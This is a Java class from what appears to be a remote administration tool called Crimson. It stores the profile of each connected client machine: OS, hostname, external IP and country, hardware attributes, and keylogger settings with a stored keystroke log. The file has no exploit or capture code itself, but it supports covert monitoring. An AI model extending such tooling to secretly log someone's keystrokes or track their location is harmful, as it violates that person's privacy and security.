/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.sv.profile;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import javax.swing.ImageIcon;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.core.Common;
import com.subterranean_security.crimson.core.Common.Instance;
import com.subterranean_security.crimson.core.Reporter;
import com.subterranean_security.crimson.core.profile.SimpleAttribute;
import com.subterranean_security.crimson.core.profile.group.AttributeGroup;
import com.subterranean_security.crimson.core.profile.group.AttributeGroupType;
import com.subterranean_security.crimson.core.profile.group.GroupAttributeType;
import com.subterranean_security.crimson.core.proto.Delta.AttributeGroupContainer;
import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
import com.subterranean_security.crimson.core.proto.Keylogger.FLUSH_METHOD;
import com.subterranean_security.crimson.core.proto.Keylogger.State;
import com.subterranean_security.crimson.core.util.CUtil;
import com.subterranean_security.crimson.sv.keylogger.Log;
import com.subterranean_security.crimson.sv.profile.attribute.Attribute;
import com.subterranean_security.crimson.sv.profile.attribute.UntrackedAttribute;
import com.subterranean_security.crimson.viewer.ui.UIUtil;

public class ClientProfile implements Serializable {

	private static final long serialVersionUID = 1L;
	private static final Logger log = LoggerFactory.getLogger(ClientProfile.class);

	// Simple Attributes
	private HashMap<SimpleAttribute, Attribute> attributes;

	// Attribute Groups
	private ArrayList<HashMap<String, AttributeGroup>> groups;

	public Collection<AttributeGroup> getModernAttributesOfGroup(GroupAttributeType agt) {
		Collection<AttributeGroup> set = groups.get(agt.ordinal()).values();
		Iterator<AttributeGroup> it = set.iterator();
		while (it.hasNext()) {
			if (!it.next().isModern()) {
				it.remove();
			}
		}
		return set;
	}

	public int countModernAttributesGroups(AttributeGroupType agt) {
		int total = 0;
		for (AttributeGroup ag : groups.get(agt.ordinal()).values()) {
			if (ag.isModern()) {
				total++;
			}
		}
		return total;
	}

	public int countAllAttributeGroups(AttributeGroupType agt) {
		return groups.get(agt.ordinal()).values().size();
	}

	public AttributeGroup getPrimaryCPU() {
		return getModernAttributesOfGroup(GroupAttributeType.CPU).iterator().next();
	}

	public ArrayList<AttributeGroup> getAttributeGroupList(GroupAttributeType g) {
		ArrayList<AttributeGroup> list = new ArrayList<AttributeGroup>();
		list.addAll(groups.get(g.ordinal()).values());
		return list;
	}

	// Transient attributes
	private transient ImageIcon ipLocationIcon;
	private transient ImageIcon osTypeIcon;
	private transient ImageIcon osMonitorIcon;
	private transient boolean initialized;
	private transient int messageLatency;

	// Client CID
	private int cid;

	private int authID;

	public int getAuthID() {
		return authID;
	}

	public void setAuthID(int authID) {
		this.authID = authID;
	}

	public void setOnline(boolean online) {
		boolean state = getOnline();
		if (online) {
			if (!state) {
				attributes.get(SimpleAttribute.CLIENT_ONLINE).set("1");
			}
		} else {
			if (state) {
				attributes.get(SimpleAttribute.CLIENT_ONLINE).set("0");
			}
		}

	}

	public boolean getOnline() {
		return attributes.get(SimpleAttribute.CLIENT_ONLINE).equals("1");
	}

	private void createAttributeIfRequired(SimpleAttribute attribute) {
		if (!attributes.containsKey(attribute)) {
			// TODO TrackedAttribute
			attributes.put(attribute, new UntrackedAttribute());
		}
	}

	public String getAttr(SimpleAttribute attribute) {
		createAttributeIfRequired(attribute);
		// System.out.println("Getting simple attribute (" +
		// attribute.toSuperString() + "<>"
		// + attributes.get(attribute).get() + ")");
		return attributes.get(attribute).get();
	}

	public void setAttr(SimpleAttribute attribute, String value) {
		createAttributeIfRequired(attribute);
		attributes.get(attribute).set(value);
	}

	// Keylogger options
	private FLUSH_METHOD flushMethod;
	private int flushValue;
	private State keyloggerState;
	private Log keylog;

	public ClientProfile(int cid) {
		this();
		this.cid = cid;
		log.debug("Created new ClientProfile: {}", cid);
	}

	public ClientProfile() {
		// Use strict capacity for HashMap because maximum size is known
		attributes = new HashMap<SimpleAttribute, Attribute>(SimpleAttribute.values().length + 1, 1.0f);

		setAttr(SimpleAttribute.CLIENT_ONLINE, "1");

		keylog = new Log();

		// initialize attribute groups
		groups = new ArrayList<HashMap<String, AttributeGroup>>();
		for (AttributeGroupType agt : AttributeGroupType.values()) {
			groups.add(new HashMap<String, AttributeGroup>());
		}
	}

	public ClientProfile initialize() {
		if (!initialized) {
			// load icons
			if (Common.instance == Instance.VIEWER) {
				loadIcons();
			}

			// load keylog
			keylog.pages.setDatabase(Common.getInstanceDatabase());
			initialized = true;
		}
		return this;
	}

	public Log getKeylog() {
		return keylog;
	}

	public void loadIcons() {
		// os icon
		if (osTypeIcon == null && getAttr(SimpleAttribute.OS_NAME) != null) {
			String icon = getAttr(SimpleAttribute.OS_NAME).replaceAll(" ", "_").toLowerCase();

			// filtering
			if (icon.contains("ubuntu")) {
				icon = "ubuntu";
			}

			// load icons or fallbacks
			osTypeIcon = UIUtil.getIconOrFallback("icons16/platform/" + icon + ".png",
					"icons16/platform/" + getAttr(SimpleAttribute.OS_FAMILY).toLowerCase() + ".png");
			osMonitorIcon = UIUtil.getIconOrFallback("icons32/platform/monitors/" + icon + ".png",
					"icons32/platform/monitors/" + getAttr(SimpleAttribute.OS_FAMILY).toLowerCase() + ".png");

			osTypeIcon.setDescription(getAttr(SimpleAttribute.OS_NAME));
			osMonitorIcon.setDescription(getAttr(SimpleAttribute.NET_HOSTNAME));

		}

		// location
		if (ipLocationIcon == null && getAttr(SimpleAttribute.NET_EXTERNALIP) != null) {
			if (CUtil.Validation.privateIP(getAttr(SimpleAttribute.NET_EXTERNALIP))) {
				ipLocationIcon = UIUtil.getIcon("icons16/general/localhost.png");
				ipLocationIcon.setDescription("Private IP");
			} else {
				try {
					ipLocationIcon = UIUtil
							.getIcon("flags/" + getAttr(SimpleAttribute.IPLOC_COUNTRYCODE).toLowerCase() + ".png");
					ipLocationIcon.setDescription(getAttr(SimpleAttribute.IPLOC_COUNTRY));
				} catch (NullPointerException e) {
					Reporter.report(Reporter.newReport().setCrComment(
							"No location icon found: " + getAttr(SimpleAttribute.IPLOC_COUNTRYCODE).toLowerCase())
							.build());

					// fall back to default
					ipLocationIcon = UIUtil.getIcon("flags/un.png");
					ipLocationIcon.setDescription("Unknown");
				}

			}

		}

	}

	public int getMessageLatency() {
		return messageLatency;
	}

	public void setMessageLatency(int messageLatency) {
		this.messageLatency = messageLatency;
	}

	public FLUSH_METHOD getFlushMethod() {
		return flushMethod;
	}

	public void setFlushMethod(FLUSH_METHOD flushMethod) {
		this.flushMethod = flushMethod;
	}

	public int getFlushValue() {
		return flushValue;
	}

	public void setFlushValue(int flushValue) {
		this.flushValue = flushValue;
	}

	public State getKeyloggerState() {
		return keyloggerState;
	}

	public void setKeyloggerState(State keyloggerState) {
		this.keyloggerState = keyloggerState;
	}

	public int getCid() {
		return cid;
	}

	public void setCid(int cid) {
		this.cid = cid;
		setAttr(SimpleAttribute.CLIENT_CID, "" + cid);
	}

	public ImageIcon getLocationIcon() {
		return ipLocationIcon;
	}

	public ImageIcon getOsNameIcon() {
		return osTypeIcon;
	}

	public ImageIcon getOsMonitorIcon() {
		return osMonitorIcon;
	}

	public Date getLastUpdate() {
		Date d = new Date(0);
		for (Attribute a : attributes.values()) {
			if (a.getTimestamp().after(d)) {
				d = a.getTimestamp();
			}
		}

		log.debug("Found last update date: {}", d);
		return d;
	}

	public EV_ProfileDelta getUpdates(Date last) {
		Date start = new Date();
		EV_ProfileDelta.Builder pd = EV_ProfileDelta.newBuilder().setCvid(getCid());

		// Simple Attributes
		for (SimpleAttribute key : attributes.keySet()) {
			Attribute a = attributes.get(key);
			if (a.getTimestamp().after(last)) {
				pd.putStrAttr(key.ordinal(), a.get());
			}
		}

		// Attribute Groups
		for (GroupAttributeType gat : GroupAttributeType.values()) {
			HashMap<String, AttributeGroup> map = groups.get(gat.ordinal());
			for (String gid : map.keySet()) {
				AttributeGroup ag = map.get(gid);
				if (ag.isModern()) {
					HashMap<AttributeGroupType, Attribute> amap = ag.getAttributeMap();
					for (AttributeGroupType agt : amap.keySet()) {
						Attribute a = amap.get(agt);
						if (a.getTimestamp().after(last)) {
							pd.addGroupAttr(AttributeGroupContainer.newBuilder().setGroupType(gat.ordinal())
									.setGroupId(gid).setAttributeType(agt.ordinal()).setValue(a.get()));
						}
					}
				}

			}
		}

		log.debug("Calulated profile update in {} ms", new Date().getTime() - start.getTime());
		return pd.build();

	}

	public void amalgamate(EV_ProfileDelta c) {
		Date start = new Date();
		if (c.hasDepartureTime()) {
			messageLatency = (int) (start.getTime() - c.getDepartureTime());
		}

		Map<Integer, String> map = c.getStrAttrMap();
		for (Integer key : map.keySet()) {
			// System.out.println("Setting (" +
			// SimpleAttribute.ordinal[key].toSuperString() + "<>" +
			// map.get(key) + ")");
			setAttr(SimpleAttribute.ordinal[key], map.get(key));
		}

		// If FIG, then set all groups to old
		if (c.hasFig() && c.getFig()) {
			for (HashMap<String, AttributeGroup> g : groups) {
				for (AttributeGroup ag : g.values()) {
					ag.setModern(false);
				}
			}
		}

		for (AttributeGroupContainer agc : c.getGroupAttrList()) {
			HashMap<String, AttributeGroup> group = groups.get(agc.getGroupType());
			if (!group.containsKey(agc.getGroupId())) {
				group.put(agc.getGroupId(), new AttributeGroup());
			}

			AttributeGroup ag = group.get(agc.getGroupId());
			ag.setModern(true);
			if (!ag.hasAttribute(agc.getAttributeType())) {
				// TODO account for tracked attributes
				ag.addAttribute(agc.getAttributeType());
			}
			ag.queryAttribute(agc.getAttributeType()).set(agc.getValue());

		}

		if (c.hasKeyloggerState()) {
			setKeyloggerState(c.getKeyloggerState());
		}
		if (c.hasFlushMethod()) {
			setFlushMethod(c.getFlushMethod());
		}
		if (c.hasFlushValue()) {
			setFlushValue(c.getFlushValue());
		}

		// TODO make amalgamation time available in some other way
		// log.debug("Profile amalgamated in {} ms", new Date().getTime() -
		// start.getTime());
	}

}
